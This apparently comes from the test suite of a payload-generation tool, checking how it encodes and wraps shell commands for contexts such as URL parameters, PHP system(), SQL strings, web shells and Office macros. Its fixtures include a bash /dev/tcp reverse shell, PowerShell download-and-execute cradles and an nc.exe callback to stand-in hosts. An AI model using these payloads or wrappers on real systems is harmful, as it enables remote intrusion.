import { describe, it, expect } from "vitest";
import { decodeUtf16leBase64, sqlQuote, urlEncodeFull, urlEncodeShell, utf16leBase64 } from "../../../engines/payloads/encode";
import { PASTE_CONTEXTS, wrapForContext } from "../../../engines/payloads/context";

const REV = "bash -i >& /dev/tcp/192.0.2.10/443 0>&1";

describe("encoders", () => {
  it("utf16leBase64 round-trips", () => {
    const s = "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1') é";
    expect(decodeUtf16leBase64(utf16leBase64(s))).toBe(s);
    expect(utf16leBase64("whoami")).toBe("dwBoAG8AYQBtAGkA");
  });
  it("urlEncodeShell encodes the shell set, leaves - raw, space becomes +", () => {
    expect(urlEncodeShell(`a b&c>d<e|f;g#h'i"j/k%l+m=n?o-p`)).toBe(
      "a+b%26c%3Ed%3Ce%7Cf%3Bg%23h%27i%22j%2Fk%25l%2Bm%3Dn%3Fo-p",
    );
  });
  it("urlEncodeShell also encodes \\ [ ] { } ^ and backtick (curl globbing, strict servers)", () => {
    expect(urlEncodeShell("a\\b[c]d{e}f^g`h")).toBe("a%5Cb%5Bc%5Dd%7Be%7Df%5Eg%60h");
  });
  it("urlEncodeShell keeps an unresolved {PLACEHOLDER} visible", () => {
    expect(urlEncodeShell("nc {LHOST} {LPORT} {x}", ["LHOST", "LPORT"])).toBe("nc+{LHOST}+{LPORT}+%7Bx%7D");
  });
  it("urlEncodeShell encodes an astral character (emoji) as UTF-8, and only a lone surrogate as U+FFFD", () => {
    expect(urlEncodeShell("a😀b")).toBe("a%F0%9F%98%80b");
    expect(urlEncodeShell("a\uD800b")).toBe("a%EF%BF%BDb");
  });
  it("urlEncodeFull is encodeURIComponent", () => {
    expect(urlEncodeFull("a b&c")).toBe("a%20b%26c");
  });
  it("sqlQuote doubles single quotes", () => {
    expect(sqlQuote("IEX(New-Object Net.WebClient).DownloadString('http://x/rev.ps1')")).toContain("''http://x/rev.ps1''");
  });
});

describe("wrapForContext", () => {
  it("lists every context with its exact label", () => {
    expect(PASTE_CONTEXTS.map((c) => c.label)).toEqual([
      "Bash prompt", "Injected command (Linux)", "URL / form parameter", "PHP system()", "cmd.exe",
      "PowerShell prompt", "Web shell ?cmd=", "Inside a SQL string", "Office macro",
      "Uploaded file", "Jenkins / Groovy console", "Node code", "Java code",
    ]);
  });
  it("bash-prompt leaves the command unchanged", () => {
    expect(wrapForContext(REV, "bash-prompt", "linux").text).toBe(REV);
  });
  it("injected-linux wraps bash -c", () => {
    const r = wrapForContext(REV, "injected-linux", "linux");
    expect(r.text).toBe("bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'");
    expect(r.notes.length).toBeGreaterThan(0);
  });
  it("injected-linux escapes embedded single quotes", () => {
    expect(wrapForContext("echo 'hi'", "injected-linux", "linux").text).toBe(`bash -c 'echo '\\''hi'\\'''`);
  });
  it("url-param Postgres case encodes > & and spaces inside bash -c", () => {
    const t = wrapForContext(REV, "url-param", "linux").text;
    expect(t).toBe("bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27");
    expect(t).not.toMatch(/[>&]/);
  });
  it("url-param windows encodes without bash -c", () => {
    expect(wrapForContext("nc.exe 192.0.2.10 443", "url-param", "windows").text).toBe("nc.exe+192.0.2.10+443");
  });
  it("webshell-param turns spaces into +", () => {
    const t = wrapForContext("id -a", "webshell-param", "linux").text;
    expect(t).toContain("+");
    expect(t).not.toContain(" ");
  });
  it("sql-string doubles quotes", () => {
    expect(wrapForContext("echo 'x'", "sql-string", "linux").text).toBe("echo ''x''");
  });
  it("php-system wraps Linux in bash -c and escapes for a single-quoted PHP string", () => {
    expect(wrapForContext("echo x", "php-system", "linux").text).toBe("system('bash -c \\'echo x\\'');");
  });
  it("macro emits chunked VBA that runs the command", () => {
    const t = wrapForContext('echo "x"', "macro", "windows").text;
    expect(t).toContain('Str = Str + "echo ""x"""');
    expect(t).toContain('CreateObject("Wscript.Shell").Run Str');
  });
  it("cmd and powershell leave the command unchanged", () => {
    expect(wrapForContext("whoami", "cmd", "windows").text).toBe("whoami");
    expect(wrapForContext("whoami", "powershell", "windows").text).toBe("whoami");
  });
});
